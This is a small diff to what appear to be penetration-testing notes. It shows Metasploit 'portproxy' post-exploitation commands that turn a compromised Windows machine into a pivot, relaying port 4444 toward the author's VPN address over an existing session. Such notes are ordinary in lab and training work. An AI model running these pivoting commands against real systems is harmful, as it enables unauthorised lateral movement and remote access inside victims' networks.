@@ -818,7 +818,7 @@ LHOST to be that of the pivot machine's external IP 172.16.80.100
 use post/windows/manage/portproxy
 msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
 msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
-msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot) (WHERE I WANT TO PIVOT)
+msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
 msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
 msf post(windows/manage/portproxy) > set SESSION 1
 msf post(windows/manage/portproxy) > run
